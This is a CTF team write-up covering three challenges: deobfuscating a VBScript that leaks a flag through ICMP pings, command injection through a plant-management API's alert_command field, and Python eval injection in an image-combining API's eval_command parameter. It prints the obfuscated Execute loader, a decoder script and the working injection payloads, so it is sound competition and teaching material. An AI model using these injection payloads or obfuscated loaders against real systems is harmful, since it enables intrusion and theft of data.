
# Huntress CTF 2024 Writeup

**Team:** CTF Goa  
**Date:** October 2024  
**Challenges Solved:** 13  
**Categories:** Web, Reverse Engineering, Binary Exploitation, Malware Analysis, Cryptography

---

# Malware Analysis

## Ping Me

**Category:** Malware  
**File Provided:** `pingme.vbs`  
**Challenge Description:** A VBScript file (`pingme.vbs`) with obfuscated code is provided. The challenge is to analyze, decode, and understand the purpose of the script.

---

## Step 1: Initial Inspection of the `pingme.vbs` Script
The `pingme.vbs` file contains the following code snippet:

```visualbasic
Execute chr(-8710+CLng(&H224A))&chr(CLng(&H1C3C)-7123)&chr(-1048+CLng(&H485))&chr(-431+CLng(&H1CF))&chr(CLng(&HECA)-3671)&chr(CLng(&H1EA3)-7739)&chr(-9460+CLng(&H2520))&chr(92448/CLng(&HB49))&chr(-8198+CLng(&H206F))&chr(CLng(&H2543)-9427)&chr(CLng(&H10E8)-4213)&chr(-5011+CLng(&H13BF))&chr(-1785+CLng(&H719))&chr(-4404+CLng(&H119D))&chr(CLng(&H128)-238)&chr(145748/CLng(&H6DC))&chr(-8792+CLng(&H22BD))&chr(-8446+CLng(&H2172))&chr(-8584+CLng(&H21A8))&chr(-1707+CLng(&H71E))&chr(57720/CLng(&H22B))&chr(CLng(&HDBB)-3483)&chr(-100+CLng(&HA1))&chr(291968/CLng(&H23A4))&chr(-2989+CLng(&HBF0))&chr(-1419+CLng(&H5FD))&chr(CLng(&H214E)-8425)&chr(CLng(&H1472)-5137)&chr(-9475+CLng(&H2577))&chr(-1670+CLng(&H6EB))&chr(CLng(&H18EC)-6301)&chr(-9755+CLng(&H267D))&chr(CLng(&HDF6)-3468)&chr(CLng(&H448)-995)&chr(-8152+CLng(&H203B))&chr(782420/CLng(&H1A59))&chr(316960/CLng(&H1EF4))&chr(174726/CLng(&H1413))&chr(-9716+CLng(&H264B))&chr(-2558+CLng(&HA51))&chr(-5012+CLng(&H13F7))&chr(28500/CLng(&HFA))&chr(CLng(&H1795)-5932)&chr(-6173+CLng(&H188D))&chr(832532/CLng(&H1C09))&chr(-8496+CLng(&H215E))&chr(-3982+CLng(&HFE1))&chr(251264/CLng(&H970))&chr(-7986+CLng(&H1F97))&chr(368496/CLng(&HD54))&chr(-1468+CLng(&H628))&chr(CLng(&HB64)-2882)&chr(-2898+CLng(&HB7B))&chr(CLng(&H1A1D)-6627)&chr(-4869+CLng(&H136E))&chr(-2229+CLng(&H925))&chr(1141490/CLng(&H26C6))&chr(-8427+CLng(&H210B))&chr(469212/CLng(&H1E0C))&chr(154656/CLng(&H12E1))&chr(CLng(&HE7B)-3642)&chr(995334/CLng(&H221B))&chr(CLng(&H51F)-1197)&chr(-1494+CLng(&H637))&chr(366267/CLng(&HBD3))&chr(267760/CLng(&H1A26))&chr(-8315+CLng(&H209D))&chr(-5088+CLng(&H1411))&chr(CLng(&H228)-504)&chr(108500/CLng(&H87A))&chr(-3564+CLng(&HE1A))&chr(CLng(&HE53)-3618)&chr(-88+CLng(&H88))&chr(CLng(&H9D9)-2465)&chr(CLng(&HC1D)-3055)&chr(CLng(&H40E)-981)&chr(-81+CLng(&H88))&chr(-8079+CLng(&H1FBD))&chr(-731+CLng(&H30C))&chr(-7987+CLng(&H1F63))&chr(332418/CLng(&H1976))&chr(-6153+CLng(&H182B))&chr(86636/CLng(&H7B1))&chr(CLng(&H210C)-8428)&chr(312426/CLng(&H23E5))&chr(CLng(&H1BE9)-7096)&chr(-2275+CLng(&H915))&chr(CLng(&H17F5)-6082)&chr(CLng(&H1454)-5158)&chr(CLng(&H739)-1796)&chr(-5662+CLng(&H1652))&chr(406732/CLng(&H228A))&chr(-525+CLng(&H23E))&chr(-926+CLng(&H3CE))&chr(236496/CLng(&H133F))&chr(CLng(&HEA9)-3707)&chr(-4694+CLng(&H128A))&chr(CLng(&H1298)-4703)&chr(-6611+CLng(&H19F5))&chr(-9443+CLng(&H250F))&chr(-3311+CLng(&HD0F))&chr(-2866+CLng(&HB54))&chr(CLng(&H1154)-4379)&chr(-4462+CLng(&H11A6))&chr(CLng(&H23E8)-9146)&chr(-7553+CLng(&H1DB6))&chr(CLng(&HCC8)-3220)&chr(384560/CLng(&H20A8))&chr(-7193+CLng(&H1C4D))&chr(52976/CLng(&H3B2))&chr(-246+CLng(&H124))&chr(-94+CLng(&H93))&chr(-2410+CLng(&H99C))&chr(1394/CLng(&H29))&chr(-7683+CLng(&H1E2F))&chr(CLng(&H11BF)-4511)&chr(103156/CLng(&HBDA))&chr(CLng(&H2141)-8456)&chr(-3422+CLng(&HD96))&chr(-5494+CLng(&H15A4))&chr(-7784+CLng(&H1EA1))&chr(-5615+CLng(&H1627))&chr(-3140+CLng(&HC72))&chr(-3731+CLng(&HEC7))&chr(429210/CLng(&H1D6A))&chr(CLng(&H1674)-5702)&chr(CLng(&H24E0)-9383)&chr(-4514+CLng(&H11DA))&chr(-3409+CLng(&HD73))&chr(-4128+CLng(&H104C))&chr(286560/CLng(&H22FB))&chr(-2859+CLng(&HB4D))&chr(CLng(&H25BA)-9605)&chr(-3495+CLng(&HDDB))&chr(-3701+CLng(&HEA3))&chr(196490/CLng(&HFAA))&chr(CLng(&HE41)-3601)&chr(-4045+CLng(&HFFD))&chr(-1431+CLng(&H5C5))&chr(CLng(&HD84)-3403)&chr(-5771+CLng(&H16C2))&chr(-4782+CLng(&H12DC))&chr(154071/CLng(&HB5B))&chr(402290/CLng(&H2012))&chr(-1655+CLng(&H699))&chr(295328/CLng(&H1A38))&chr(CLng(&H21AD)-8589)&chr(-5308+CLng(&H14DE))&chr(-7308+CLng(&H1CC1))&chr(-7625+CLng(&H1DF9))&chr(CLng(&H1775)-5959)&chr(CLng(&H8EB)-2226)&chr(-5757+CLng(&H16B5))&chr(CLng(&H1568)-5434)&chr(381865/CLng(&H1C25))&chr(CLng(&HCBD)-3207)&chr(-6638+CLng(&H1A1C))&chr(99921/CLng(&H6D9))&chr(80304/CLng(&H59A))&chr(-7805+CLng(&H1E9F))&chr(-1820+CLng(&H748))&chr(CLng(&H18B3)-6291)&chr(-5640+CLng(&H162A))&chr(-4824+CLng(&H1311))&chr(352744/CLng(&H189B))&chr(-292+CLng(&H152))&chr(CLng(&H20B8)-8319)&chr(-1584+CLng(&H669))&chr(CLng(&H8C7)-2201)&chr(-2187+CLng(&H8C4))&chr(CLng(&HDC5)-3470)&chr(-3268+CLng(&HCF2))&chr(-5577+CLng(&H15FE))&chr(-309+CLng(&H16C))&chr(-1144+CLng(&H49A))&chr(-9516+CLng(&H2558))&chr(CLng(&H3CD)-941)&chr(-4067+CLng(&H1005))&chr(289198/CLng(&H170E))&chr(-3400+CLng(&HD78))&chr(-8493+CLng(&H215E))&chr(-5902+CLng(&H173C))&chr(387112/CLng(&H1C88))&chr(-6594+CLng(&H19F2))&chr(CLng(&H160F)-5601)&chr(CLng(&HE38)-3587)&chr(460252/CLng(&H2293))&chr(-306+CLng(&H160))&chr(-1576+CLng(&H659))&chr(-853+CLng(&H385))&chr(32640/CLng(&H2A8))&chr(-5770+CLng(&H16AC))&chr(406472/CLng(&H2416))&chr(59552/CLng(&H745))&chr(-3842+CLng(&HF24))&chr(135733/CLng(&HA01))&chr(-4781+CLng(&H12E0))&chr(347576/CLng(&H1D84))&chr(-1448+CLng(&H5DC))&chr(567777/CLng(&H26E9))&chr(CLng(&H2660)-9778)&chr(-6322+CLng(&H18E7))&chr(368526/CLng(&H1C3A))&chr(-9529+CLng(&H2567))&chr(-3965+CLng(&HFB2))&chr(CLng(&H14C3)-5261)&chr(-505+CLng(&H21B))&chr(-532+CLng(&H240))&chr(68352/CLng(&H858))&chr(-789+CLng(&H337))&chr(CLng(&H382)-845)&chr(-9302+CLng(&H248D))&chr(-5774+CLng(&H16BC))&chr(20972/CLng(&H1AC))&chr(CLng(&H22F9)-8903)&chr(-1558+CLng(&H64B))&chr(-8186+CLng(&H2028))&chr(CLng(&H527)-1268)&chr(-9869+CLng(&H26C2))&chr(-6122+CLng(&H1818))&chr(CLng(&H1E3C)-7689)&chr(-4075+CLng(&H1020))&chr(4658/CLng(&H89))&chr(CLng(&H11F7)-4558)&chr(357222/CLng(&H180F))&chr(540120/CLng(&H1E24))&chr(-836+CLng(&H3B3))&chr(986100/CLng(&H21CA))&chr(-2426+CLng(&H99A))&chr(CLng(&H1329)-4800)&chr(191968/CLng(&H176F))&chr(CLng(&H8A9)-2156)&chr(CLng(&H1ED5)-7861)&chr(5616/CLng(&H75))&chr(312224/CLng(&H261D))&chr(152208/CLng(&H714))&chr(CLng(&H12CB)-4700)&chr(CLng(&H202)-482)&chr(217685/CLng(&HA01))&chr(465036/CLng(&H1B86))&chr(-1002+CLng(&H459))&chr(630162/CLng(&H150A))&chr(669680/CLng(&H17C8))&chr(-2383+CLng(&H9B3))&chr(CLng(&H1385)-4957)&chr(-9107+CLng(&H23FC))&chr(1078112/CLng(&H259A))&chr(-1751+CLng(&H74A))&chr(274864/CLng(&H1A30))&chr(-1911+CLng(&H7B1))&chr(-368+CLng(&H190))&chr(-7293+CLng(&H1C9D))&chr(-5151+CLng(&H143F))&chr(-2252+CLng(&H8EC))&chr(CLng(&HA30)-2493)&chr(CLng(&H18D3)-6251)&chr(-7857+CLng(&H1EDF))&chr(-657+CLng(&H2E3))&chr(-3390+CLng(&HDB3))&chr(-6553+CLng(&H1A07))&chr(-5826+CLng(&H16E2))&chr(-567+CLng(&H259))&chr(-5399+CLng(&H157A))&chr(CLng(&H1473)-5126)&chr(24+CLng(&H4C))&chr(32960/CLng(&H406))&chr(CLng(&H1D18)-7401)&chr(105381/CLng(&H515))&chr(221824/CLng(&H1B14))&chr(136206/CLng(&HB52))&chr(341055/CLng(&HD75))&chr(289632/CLng(&H235B))&chr(-9504+CLng(&H2590))&chr(692055/CLng(&H19BF))&chr(-3239+CLng(&HD15))&chr(-7859+CLng(&H1F1A))&chr(-2106+CLng(&H85A))&chr(-3016+CLng(&HBEA))&chr(CLng(&H156B)-5451)&chr(-4032+CLng(&HFE6))&chr(309408/CLng(&H25C5))&chr(484365/CLng(&H1205))&chr(449344/CLng(&HFAC))&chr(-1842+CLng(&H7A5))&chr(86360/CLng(&H86F))&chr(997080/CLng(&H2518))&chr(CLng(&HCDA)-3249)&chr(CLng(&HD5F)-3379)&chr(-7698+CLng(&H1E32))&chr(304128/CLng(&H18C0))&chr(CLng(&H1CBB)-7311)&chr(-938+CLng(&H3CA))&chr(-9779+CLng(&H2679))&chr(CLng(&H3AC)-843)&chr(282096/CLng(&HA34))&chr(CLng(&H783)-1808)&chr(675589/CLng(&H1A21))&chr(65366/CLng(&H467))&chr(438516/CLng(&H15F6))&chr(CLng(&H5C6)-1377)&chr(83400/CLng(&H2B7))&chr(CLng(&H260D)-9625)&vbCrlf
```
## Observations
Use of `chr()` Function: The `chr()` function is used extensively, where each `chr()` argument performs arithmetic on hexadecimal and integer values.
Concatenation into a String: Each `chr()` result is concatenated to form a long string, which is then passed to Execute. This suggests that the obfuscated characters likely form a hidden script or command.
Likely Intent: The use of Execute to dynamically run a constructed string implies potential malicious intent, such as running a command or script on the machine.

---

## Step 2: Deobfuscating the chr Values
The primary challenge here is decoding each chr() function. To reveal the hidden string, each chr() argument needs to be evaluated.

### Approach
To decode each `chr()` expression:

Extract each arithmetic expression inside `chr()`.
Calculate each expression’s result to determine the ASCII value.
Convert each result to a character using `chr()` in Python.
Concatenate the decoded characters to reveal the hidden string.
Python Script for Decoding chr Expressions
Here’s the Python code used to evaluate each expression in the VBS file:

``` python

import sys

def evalExp(expr,tick):
    expr = expr.replace("H", "0x")
    if "vbCrlf" in expr:
        sys.exit
    if ")-" in expr:
        #print(")- expression")
        xd = expr.replace("-",",").split(",")
        #print(xd)
        x=eval(f"ord({xd[0]}) - int({xd[1]})")
        print(chr(x),end="")
        
    else:
        if "/" in expr:
            modified_expr = expr.replace('/', '//')
            #print("Modified Exp")
            #print(modified_expr)
            print(eval(modified_expr),end="")
            # #printf("modified exp :: ",modified_expr)
            # xd = modified_expr.replace("-",",").split(",")
            # x=eval(f"ord({xd[0]}) - int({xd[1]})")
            # print(chr(x),end="")  
        else:
            #print("normal exp")
            print(eval(expr),end="")
def de():
    exps=[""]
    sep=[]
    with open('ping_me.vbs','r') as f:
        content = f.read()
    newcontent = content.replace("Execute"," ")
    sep = newcontent.replace("CLng(&","")
    exps = sep.replace(")&",",").split(",")
    for i in range(0,len(exps),1):
        if "vbCrlf" in exps[i]:
            sys.exit()
        else:
            evalExp(exps[i],i)
de()

```

By running this script, each arithmetic expression is evaluated to a corresponding ASCII character, reconstructing the obfuscated string.

---

## Step 3: Understanding the Decoded Output
Once all the characters are decoded, the concatenated string reveals a hidden command. In this case, it was a PowerShell command that likely connects to an external server and performs malicious actions. Here’s a breakdown:

Decoded Command
The decoded command looked something like this:


```visualbasic
Dim sh, ips, i
Set sh = CreateObject("WScript.Shell")
ips = Array("102.108.97.103", "123.54.100.49", "98.54.48.52", "98.98.49.98", "54.100.97.51", "50.98.56.98", "98.99.97.57", "101.50.54.100", "53.49.53.56", "57.125.35.35")
For i = 0 To UBound(ips)
    sh.Run "cmd /Q /c ping " & ips(i), 0, False
Next
```

### Explanation

1. **Variable Declarations**
   - **`Dim sh, ips, i`**: Declares three variables:
     - `sh`: Stores a reference to a shell object, allowing the script to interact with the Windows command shell.
     - `ips`: An array that holds a list of IP addresses to be pinged.
     - `i`: A loop index variable for iterating over the `ips` array.

2. **Shell Object Initialization**
   - **`Set sh = CreateObject("WScript.Shell")`**: Initializes `sh` as a `WScript.Shell` object. This object enables the script to execute commands, such as running `cmd` and `ping`.

3. **IP Array Definition**
   - **`ips = Array(...)`**: Defines the `ips` array with multiple IP addresses as strings. Each IP in this list is targeted by the `ping` command in the loop.

4. **Looping Through the IP Array**
   - **`For i = 0 To UBound(ips)`**: Starts a `For` loop that iterates from `0` to `UBound(ips)`, where `UBound(ips)` represents the last index in the `ips` array. This loop ensures each IP address is processed individually.

5. **Executing the Ping Command**
   - **`sh.Run "cmd /Q /c ping " & ips(i), 0, False`**: Constructs and executes a command to ping each IP address in the list. Here’s the breakdown:
     - **`"cmd /Q /c ping " & ips(i)`**: Forms the command string:
       - **`cmd`**: Invokes the command prompt.
       - **`/Q`**: Suppresses command echoing to reduce output.
       - **`/c`**: Executes the command and then terminates.
       - **`ping " & ips(i)`**: Pings the current IP address in the loop.
     - **`0`**: Runs the command without displaying a visible command prompt window.
     - **`False`**: Specifies that each ping command should run asynchronously, allowing multiple pings to execute concurrently without waiting for each to finish.

### Summary of Script Behavior
This script pings each IP address listed in `ips` without opening a visible command prompt window. By setting `False` as the final parameter in `sh.Run`, each `ping` command runs asynchronously, allowing the script to iterate quickly through the entire list without waiting for each command to complete.

---

## Step 4: Running Script in safe environment

So after analyzing the script i can state that it Ping all list of IP addresses so i opened wireshark and added filter for ICMP packets in the echo request of an ip address i can see some data starting from `flag` and it was at 31st to 34th bytes of the packet so i created amn following python script to extract the flag

```python

from scapy.all import rdpcap, ICMP

def display_icmp_packet_bytes(pcap_file):
    packets = rdpcap(pcap_file)  # Read the pcap file
    count = 0  # Initialize a counter for the number of packets
    for packet in packets:
        if packet.haslayer(ICMP):  # Check if the packet is an ICMP packet
            packet_bytes = bytes(packet)  # Convert the packet to bytes
            print(f"ICMP Packet Next 4 Bytes After Skipping 31: {packet_bytes[30:35]}")
            
# Replace 'your_file.pcap' with the path to your actual pcap file
display_icmp_packet_bytes('xxx.pcapng')

```

### Summary
The function display_icmp_packet_bytes is designed to read a specified PCAP file, filter out the ICMP packets, convert each packet to its byte form, and then display a specific range of bytes (bytes 30 to 34) from each ICMP packet. This can be useful for analyzing the contents of ICMP packets, such as the Echo Request and Echo Reply messages used in network diagnostics (ping).

So when i executed the script i got the following output

```bash
ICMP Packet Next 4 Bytes After Skipping 31: b'""""\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'""""\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'""""\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'""""\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'flag\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'{6d1\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'b604\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bb1b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'6da3\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'2b8b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bca9\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'e26d\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'5158\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'9}##\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'\xc0\xa8\x00h\x00'
ICMP Packet Next 4 Bytes After Skipping 31: b'b604\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'\xc0\xa8\x00h\x00'
ICMP Packet Next 4 Bytes After Skipping 31: b'b604\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'\xc0\xa8\x00h\x00'
ICMP Packet Next 4 Bytes After Skipping 31: b'b604\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'\xc0\xa8\x00h\x00'
ICMP Packet Next 4 Bytes After Skipping 31: b'flag\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bb1b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'{6d1\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'e26d\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'2b8b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'9}##\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'5158\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'6da3\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bca9\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'{6d1\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bb1b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'flag\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'6da3\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'9}##\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bca9\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'e26d\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'2b8b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'5158\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bb1b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'flag\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'{6d1\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'5158\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'2b8b\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'9}##\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'bca9\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'6da3\x08'
ICMP Packet Next 4 Bytes After Skipping 31: b'e26d\x08'

```

So the extracted flag is

```bash
flag{6d1b604bb1b6da32b8bbca9e26d51589}
```


This was an exciting CTF with a variety of challenging problems that tested our skills across multiple domains. We’re proud of our efforts and looking forward to the next challenge!


## Plantopia CTF Writeup

### Challenge Overview
**Title**: Plantopia

In this challenge, the Plantopia website provides information on various plants, including water levels and sunlight levels. Upon investigating the homepage, I discovered several API endpoints that interact with plant data and administrative functions. Here’s the breakdown of my approach to exploiting the API to retrieve sensitive information.

---

## Initial Exploration

### Homepage
On the homepage, I observed the following details:
- A list of plants with specific attributes such as **water level** and **sunlight level**.
- API endpoint locations were displayed at the top, which seemed to provide access to various plant operations.

### Key Endpoints Discovered
Clicking on the provided API Docs link revealed the following API endpoints:

- **Plant Operations**:
  - `/api/plants`
  - `/api/plants/{plant_id}/water`
  - `/api/plants/{plant_id}/edit`

- **Administrative Operations**:
  - `/api/admin/sendmail`
  - `/api/admin/settings`
  - `/api/admin/logs`


---

## Exploitation Steps

### Step 1: Modifying Plant Details
To test for command injection, I focused on editing the details of **Plant ID 1** by sending a modified payload to the `/api/plants/1/edit` endpoint.

I changed the `alert_command` parameter from its default value:

```json
{
  "description": "A beautiful sunflower.",
  "sunlight_level": 80,
  "watering_threshold": 50,
  "alert_command": "/usr/sbin/sendmail -t"
}
```
to
```json
{
  "description": "A beautiful sunflower.",
  "sunlight_level": 80,
  "watering_threshold": 50,
  "alert_command": "cat flag.txt"
}
```
After making this change, I executed the `/api/admin/sendmail` endpoint for Plant ID 1.

---

## Viewing Execution Results

Upon executing the modified command, I accessed the `/api/admin/logs` endpoint, which logged all executed commands. In the logs, I found the output of my command, which included the contents of `flag.txt`.


## PillowFight CTF Writeup

### Challenge Overview
**Title**: PillowFight

This challenge features an image upload service with an **advanced image combining API**. The site also provides API documentation, which led to the discovery of a command injection vulnerability in the `eval_command` parameter. By leveraging this vulnerability, I successfully retrieved the flag.

---

## Initial Exploration

### Homepage Features
On the homepage, I found:
- An **image upload feature** allowing two image files to be uploaded.
- A **Combine Image** button to merge the uploaded images.

### API Documentation
Additionally, there was a link to API documentation. However, the documentation page would continuously load without displaying any content.

---

## Investigating the API Documentation

### Handling the Redirect
After noticing the continuous loading issue, I suspected a redirect loop. I used the following `curl` command to handle redirects and access the API documentation:

```bash
curl -L http://challenge.ctf.games:31562/swagger
```
Step 2: Analyzing the Response

The response contained HTML for the Swagger UI, which referenced resources such as /static/swagger.json. This JSON file likely contained details about the API endpoints.

Step 3: Discovering the JSON Endpoint

In the Swagger HTML, I found a JSON configuration file located at /static/swagger.json. Accessing this file revealed further details about the API, including a suspicious parameter named eval_command:
```bash
"default": "convert(img1 + img2, 'L')"
```
The presence of eval_command suggested that the application might be executing commands dynamically, hinting at a command injection vulnerability.


---

# Exploitation Steps

## Step 1: Setting Up Burp Suite for Request Interception

To test the command injection, I used **Burp Suite** to intercept and modify the requests sent by the homepage image upload feature. Here’s the approach I took:

1. Uploaded two images through the homepage’s upload feature.
2. Intercepted the HTTP request with Burp Suite.
3. Added the request for the `eval_command` data

---

## Step 2: Testing Command Injection with `eval_command`

I experimented by setting `eval_command` as `img1` in the intercepted request, which returned a image as a response. This confirmed that the server was indeed processing the `eval_command` dynamically.

---

## Step 3: Injecting the Payload

With confirmation of command execution, I crafted a payload to read the contents of `flag.txt` by modifying `eval_command` as follows:

```python
img1 + open('flag.txt').read()
```
This payload was designed to concatenate the contents of flag.txt with img1. Upon sending the modified request, I received an error response containing the flag, confirming the success of the command injection attack.
